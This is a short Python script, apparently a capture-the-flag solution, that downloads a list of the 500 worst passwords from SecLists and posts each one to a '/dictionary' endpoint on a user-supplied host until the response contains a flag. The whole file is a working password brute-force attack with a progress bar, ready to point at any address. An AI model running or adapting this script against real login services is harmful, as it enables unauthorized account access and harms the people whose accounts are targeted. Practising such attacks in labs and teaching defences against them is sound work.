import requests
from tqdm import tqdm

ip = input("Enter ip or url without http(s):// and without '/' at the end: ")
port = input("Enter port number: ")

# Download a list of common passwords from the web and split it into lines
passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/500-worst-passwords.txt").text.splitlines()

# Initialize tqdm for the progress bar
with tqdm(passwords, desc="Progress", unit=" password", ncols=100) as pbar:
    for password in pbar:
        
        response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})

        # Check if the server responds with success and contains the 'flag'
        if response.ok and 'flag' in response.json():
            pbar.close()  # Close the progress bar properly
            print()  
            print(f"Correct password found: {password}\n")
            print(f"Flag: {response.json()['flag']}")
            exit(0)
